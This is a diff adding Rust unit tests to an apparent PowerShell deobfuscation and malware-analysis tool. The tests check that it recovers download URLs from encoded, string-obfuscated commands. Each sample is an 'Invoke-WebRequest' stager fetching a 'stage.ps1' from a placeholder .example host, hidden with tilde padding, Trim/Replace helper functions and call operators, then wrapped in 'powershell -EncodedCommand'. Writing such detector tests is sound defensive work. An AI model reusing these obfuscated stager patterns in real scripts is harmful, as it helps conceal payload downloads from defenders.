@@ -23762,6 +23762,214 @@ Format-Text 'Invoke-WebRequest -Uri https://ps-array' '-format-extractor' '.exam
     }
 
     #[test]
+    fn ps1_literal_dot_replace_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let obfuscated =
+            "I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~d~o~t~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1";
+        let inner = format!(
+            r#"function Clean($value,$needle,$replacement) {{
+  return $value.Replace($needle,$replacement)
+}}
+Clean '{obfuscated}' '~' ''"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-dot-replace-extractor.example/stage.ps1"
+                )
+            }),
+            "literal dot-replace extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_trimstart_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-trimstart-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($value,$chars) {{
+  return $value.TrimStart($chars)
+}}
+Clean '~~~{decoded}' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-trimstart-extractor.example/stage.ps1"
+                )
+            }),
+            "literal trimstart extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_param_block_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-param-block-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean {{
+  param($value,$chars)
+  return $value.Trim($chars)
+}}
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-param-block-extractor.example/stage.ps1"
+                )
+            }),
+            "literal param-block extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_quoted_call_operator_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-quoted-call-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($value,$chars) {{
+  return $value.Trim($chars)
+}}
+& 'Clean' '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-quoted-call-extractor.example/stage.ps1"
+                )
+            }),
+            "literal quoted call-operator extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_variable_call_operator_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-variable-call-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"$fn = 'Clean'
+function Clean($value,$chars) {{
+  return $value.Trim($chars)
+}}
+& $fn '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-variable-call-extractor.example/stage.ps1"
+                )
+            }),
+            "literal variable call-operator extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_parenthesized_receiver_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-paren-receiver-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($value,$chars) {{
+  return ($value).Trim($chars)
+}}
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-paren-receiver-extractor.example/stage.ps1"
+                )
+            }),
+            "literal parenthesized-receiver extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_ireplace_literal_resolves_url() {
         let inner =
             r#"Invoke-WebRequest -Uri ('hxxps://ps-ireplace.example/stage' -ireplace 'xx','tt')"#;
